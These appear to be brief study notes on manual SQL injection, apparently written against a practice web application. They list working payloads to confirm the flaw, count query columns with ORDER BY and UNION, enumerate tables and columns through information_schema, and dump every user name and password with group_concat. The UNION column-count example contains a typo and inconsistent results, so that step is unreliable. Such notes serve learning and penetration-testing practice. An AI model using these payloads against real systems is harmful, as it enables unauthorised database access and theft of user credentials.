- confirm SQLi:  `1'` ->  error -> confirm SQLi
- get data: `' OR 1 = 1 -- -`
- Determine the number of columns the query returns: `ORDER BY` or `UNION`
- 
```
## order by
1' order by 1 -- - true
1' order by 2 -- - true
1' order by 3 -- - false

--> The query returns two columns.

## union
1' union select all 1 -- - false
1' uniom select all 2 -- - true

```

- <font color="#ffc000">Enumerating:</font>
- 
```bash
## define table
'UNION SELECT ALL NULL,table_name from information_schema.tables -- -
# --> tables: users

## Determine the number of columns in the table.
'union select all null,group_concat(column_name) from information_schema.columns where table_name = "users" -- -
# --> column: user_id,first_name,last_name,user,password,avatar,last_login,failed_login,role,account_enabled

## get user and password
'union select null,group_concat(user,0x3a,password SEPARATOR 0x0a) from users -- -
'union select null,group_concat('User: ',user,0x20,'Pass: ',password SEPARATOR 0x3c62723e) from users -- -



```

